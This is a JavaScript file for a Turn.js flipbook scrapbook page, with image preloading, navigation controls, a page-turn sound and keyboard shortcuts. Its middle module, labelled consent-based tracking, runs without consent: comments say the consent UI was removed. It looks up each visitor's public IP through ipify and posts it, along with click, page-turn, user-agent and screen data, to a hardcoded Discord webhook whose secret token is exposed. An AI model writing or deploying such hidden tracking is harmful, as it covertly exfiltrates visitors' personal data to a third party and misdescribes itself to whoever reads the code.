// Improved initialization: preload images, force page sizes, then init Turn.js
(function() {
    // Helper: preload images (returns a Promise)
    function preloadImages(selector, timeout = 5000) {
        const imgs = Array.from(document.querySelectorAll(selector));
        const promises = imgs.map(img => new Promise(resolve => {
            if (img.complete) return resolve({img, success: true});
            const onLoad = () => { cleanup(); resolve({img, success: true}); };
            const onError = () => { cleanup(); resolve({img, success: false}); };
            const cleanup = () => { img.removeEventListener('load', onLoad); img.removeEventListener('error', onError); };
            img.addEventListener('load', onLoad);
            img.addEventListener('error', onError);
        }));

        // Timeout fallback
        const timeoutPromise = new Promise(resolve => setTimeout(resolve, timeout));
        return Promise.race([Promise.all(promises), timeoutPromise.then(() => promises)]);
    }

    function forcePageSizes($book, pageWidth, pageHeight) {
        // Turn.js treats book width as full spread, page width is half
        const pages = $book.find('.page');
        pages.each(function() {
            // set the page wrapper size used by turn.js
            $(this).css({width: pageWidth + 'px', height: pageHeight + 'px'});
            // ensure inner img fills the page
            $(this).find('img').css({width: '100%', height: '100%', 'object-fit': 'cover', display: 'block'});
        });
    }

    function initTurn() {
        const $book = $('.scrapbook');
        // Feature detection: if Turn.js isn't available, fall back to stacked pages
        if (!$.fn.turn) {
            console.warn('Turn.js not found: falling back to static layout');
            $book.addClass('no-turn');
            // make images fill
            forcePageSizes($book, 250, 500);
            return;
        }

        // Decide whether to enable gradients/acceleration based on support
        const supports3d = (function() {
            const el = document.createElement('p');
            let has3d;
            const transforms = {
                'webkitTransform':'-webkit-transform',
                'OTransform':'-o-transform',
                'msTransform':'-ms-transform',
                'MozTransform':'-moz-transform',
                'transform':'transform'
            };
            // Add it to the body to get the computed style
            document.body.insertBefore(el, null);
            for (let t in transforms) {
                if (el.style[t] !== undefined) {
                    el.style[t] = 'translate3d(1px,1px,1px)';
                    has3d = window.getComputedStyle(el).getPropertyValue(transforms[t]);
                }
            }
            document.body.removeChild(el);
            return (has3d !== undefined && has3d.length > 0 && has3d !== 'none');
        })();

        const turnOpts = {
            width: 500,
            height: 500,
            autoCenter: true,
            gradients: supports3d, // enable gradients only if 3D supported
            acceleration: supports3d,
            display: 'double'
        };

        $book.turn(turnOpts);

        // Force page sizes and update after a short delay to let turn.js layout
        forcePageSizes($book, 250, 500);

        // Some browsers need the wrapper sizes set as inline styles after turn creates them.
        function fixPageWrappers() {
            try {
                const wrapperSelector = '.page-wrapper';
                const wrapperEls = $book.parent().find(wrapperSelector);
                if (wrapperEls.length) {
                    wrapperEls.each(function() {
                        const $w = $(this);
                        // In double display, each page wrapper should be 250x500
                        $w.css({width: '250px', height: '500px'});
                        // ensure inner .page is also set
                        $w.children().css({width: '250px', height: '500px'});
                    });
                }
            } catch (err) {
                // ignore
            }
        }

        // Run fixes a few times shortly after init to handle race conditions
        fixPageWrappers();
        setTimeout(fixPageWrappers, 60);
        setTimeout(fixPageWrappers, 300);

        // Ensure Turn.js gets updated on resize; throttle to avoid jank
        let resizeTimer = null;
        window.addEventListener('resize', () => {
            if (resizeTimer) clearTimeout(resizeTimer);
            resizeTimer = setTimeout(() => {
                try {
                    $book.turn('size', 500, 500);
                    forcePageSizes($book, 250, 500);
                    fixPageWrappers();
                    $book.turn('update');
                    $book.turn('center');
                } catch (e) {
                    // ignore errors
                }
            }, 120);
        });
    }

    // Run preload then init
    document.addEventListener('DOMContentLoaded', () => {
        // Preload images inside scrapbook
        preloadImages('.scrapbook .page img', 4000).then(() => {
            initTurn();
        }).catch(() => {
            // Fallback: still init after timeout
            initTurn();
        });
    });
})();

// Controls wiring and consent-based tracking
(function() {
    // Tracking module: anonymous events are stored locally and forwarded to webhook
    const STORAGE_KEY = 'scrapbook_events_v1';
    const sessionId = sessionStorage.getItem('scrapbook_session_id') || (function(){ const id = 's_'+Math.random().toString(36).slice(2,10); sessionStorage.setItem('scrapbook_session_id', id); return id; })();

    // Replace with your target webhook (user-supplied). Note: direct client->Discord webhook requests may be blocked by CORS.
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1431819042343358585/ZRyvQ0C9UWpfz6Xli-lt57PMNXUMh6dRkkBORMOqKDRPWOrpqPC7WsJVoJkMpDvxN7Pa';

    function sendToWebhook(evt) {
        // Build a compact content string for Discord (max ~2000 chars)
        try {
            const dataSummary = JSON.stringify(evt.data || {}).slice(0,800);
            const content = `Event: ${evt.type}\nsession:${evt.sessionId} ts:${evt.ts}\n${dataSummary}`;
            // Attempt a direct POST. This may fail due to CORS; we don't block on it.
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content })
            }).catch(()=>{/*ignore*/});
        } catch (e) { /* ignore */ }
    }

    // Try to flush the local events queue to the webhook. If successful, clear local storage.
    async function flushQueue() {
        try {
            const raw = localStorage.getItem(STORAGE_KEY) || '[]';
            const events = JSON.parse(raw);
            if (!events || !events.length) return;
            const summary = JSON.stringify(events).slice(0,1800);
            const payload = { content: `QueuedEvents: count=${events.length}\nsample=${summary}` };
            const resp = await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
            if (resp && resp.ok) {
                // cleared successfully
                localStorage.removeItem(STORAGE_KEY);
            }
        } catch (e) {
            // ignore; will retry later
        }
    }

    // --- Public IP gathering & one-shot send ---
    // We collect only the public IP (via ipify) and send that once per session.
    async function getPublicIP() {
        try {
            const resp = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
            if (!resp.ok) return null;
            const j = await resp.json();
            return j.ip || null;
        } catch (e) { return null; }
    }

    async function sendPublicIPToWebhook(publicIp) {
        try {
            if (!publicIp) return;
            const content = `PublicIP (session:${sessionId}) ts:${Date.now()}\n${publicIp}`;
            await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ content }) }).catch(()=>{});
        } catch (e) { /* ignore */ }
    }

    // Gather public IP and send once per session. Uses sessionStorage sentinel to avoid repeats.
    async function gatherAndSendAddressesOnce() {
        try {
            const sentKey = 'scrapbook_publicip_sent_' + (sessionId || 'anon');
            if (sessionStorage.getItem(sentKey)) return; // already sent this session
            const publicIp = await getPublicIP();
            if (publicIp) {
                // Keep a small record locally for auditing
                const record = { type:'public_ip', ts: Date.now(), sessionId, publicIp };
                const evts = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
                evts.push(record);
                localStorage.setItem(STORAGE_KEY, JSON.stringify(evts));
                // Attempt to send to webhook (may be blocked by CORS)
                try { await sendPublicIPToWebhook(publicIp); } catch(e){}
            }
            sessionStorage.setItem(sentKey, '1');
        } catch (e) { /* ignore */ }
    }

    function recordEvent(type, data) {
        try {
            const evt = { type, ts: Date.now(), sessionId, ua: navigator.userAgent||'', screen: {w:screen.width, h:screen.height}, data };
            const events = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
            events.push(evt);
            localStorage.setItem(STORAGE_KEY, JSON.stringify(events));
            // NOTE: per-request event forwarding to the webhook was removed by user request.
        } catch (e) { /* ignore */ }
    }

    function exportLogs() {
        const data = localStorage.getItem(STORAGE_KEY) || '[]';
        const blob = new Blob([data], {type:'application/json'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = 'scrapbook-events.json'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
    }

    function clearLogs() { localStorage.removeItem(STORAGE_KEY); }

    // Wire controls once DOM ready
    document.addEventListener('DOMContentLoaded', () => {
        const prev = document.getElementById('prevBtn');
        const next = document.getElementById('nextBtn');
        const exportBtn = document.getElementById('exportLogs');
        const clearBtn = document.getElementById('clearLogs');
        const currentEl = document.getElementById('currentPage');
        const totalEl = document.getElementById('totalPages');
        const progressBar = document.getElementById('progressBar');
        // Consent UI removed; tracking runs automatically and is forwarded to the configured webhook.

        exportBtn && exportBtn.addEventListener('click', () => { exportLogs(); recordEvent('export','download'); });
        clearBtn && clearBtn.addEventListener('click', () => { clearLogs(); recordEvent('clear','cleared'); alert('Local logs cleared'); });

    // Attempt to flush any queued events to the webhook now and periodically
    try { flushQueue(); } catch(e){}
    setInterval(() => { try { flushQueue(); } catch(e){} }, 60 * 1000);

        // Prev/Next handlers
        prev && prev.addEventListener('click', () => { if (window.jQuery && jQuery.fn.turn) { $('.scrapbook').turn('previous'); recordEvent('ui','prev_click'); } });
        next && next.addEventListener('click', () => { if (window.jQuery && jQuery.fn.turn) { $('.scrapbook').turn('next'); recordEvent('ui','next_click'); } });

        // Update page indicator when Turn.js triggers turned event; fallback when no Turn.js
        function updateIndicator(page, total) {
            if (currentEl) currentEl.textContent = page;
            if (totalEl) totalEl.textContent = total;
            if (progressBar) {
                const pct = Math.round((page / total) * 100);
                progressBar.style.width = pct + '%';
            }
        }

        if (window.jQuery && jQuery.fn && jQuery.fn.turn) {
            const $b = $('.scrapbook');
            // When turned, update UI and record
            $b.on('turned', function(e, page, view) {
                const total = $b.turn('pages');
                updateIndicator(page, total);
                recordEvent('turn', {page, view, total});
            });
            // Initialize indicator after Turn.js is ready
            setTimeout(() => { try { const total = $b.turn('pages'); const page = $b.turn('page') || 1; updateIndicator(page, total); } catch(e){} }, 200);
        } else {
            // No Turn.js: count .page elements
            const pages = document.querySelectorAll('.scrapbook .page').length||1;
            updateIndicator(1,pages);
        }

        // Track clicks on the book area
        const bookEl = document.querySelector('.scrapbook');
        if (bookEl) bookEl.addEventListener('click', (e)=>{ recordEvent('click',{x:e.clientX,y:e.clientY, target: e.target.tagName}); }, {passive:true});

    // Track session start and attempt to gather/send tracking addresses once per session
    try { gatherAndSendAddressesOnce(); } catch(e){}
    recordEvent('session','start');
        window.addEventListener('beforeunload', ()=>{ recordEvent('session','end'); });
    });
})();

// Page-turn sound (WebAudio) and touch hint behavior
(function() {
    function playTurnSound() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const o = ctx.createOscillator();
            const g = ctx.createGain();
            o.type = 'square';
            o.frequency.setValueAtTime(880, ctx.currentTime);
            g.gain.setValueAtTime(0.0001, ctx.currentTime);
            g.gain.exponentialRampToValueAtTime(0.08, ctx.currentTime + 0.01);
            g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.14);
            o.connect(g); g.connect(ctx.destination);
            o.start();
            setTimeout(() => { o.stop(); ctx.close(); }, 150);
        } catch (e) {
            // audio API not supported
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        // Bind to turn event if Turn.js is present
        if (window.jQuery && jQuery.fn && jQuery.fn.turn) {
            $('.scrapbook').on('turn', function() { playTurnSound(); });
        }

        // Auto-hide touch hint after first interaction
        const hint = document.querySelector('.touch-hint');
        if (hint) {
            function hideHint() { hint.style.display = 'none'; window.removeEventListener('touchstart', hideHint); window.removeEventListener('mousedown', hideHint); }
            window.addEventListener('touchstart', hideHint, {passive: true});
            window.addEventListener('mousedown', hideHint);
        }
        // Keyboard navigation: left/right arrows, Home/End
        window.addEventListener('keydown', (e) => {
            if (!window.jQuery || !jQuery.fn || !jQuery.fn.turn) return;
            const $book = $('.scrapbook');
            if (e.key === 'ArrowRight') { e.preventDefault(); try { $book.turn('next'); } catch(_) {} }
            if (e.key === 'ArrowLeft') { e.preventDefault(); try { $book.turn('previous'); } catch(_) {} }
            if (e.key === 'Home') { e.preventDefault(); try { $book.turn('page', 1); } catch(_) {} }
            if (e.key === 'End') { e.preventDefault(); try { $book.turn('page', $book.turn('pages')); } catch(_) {} }
        });
    });
})();

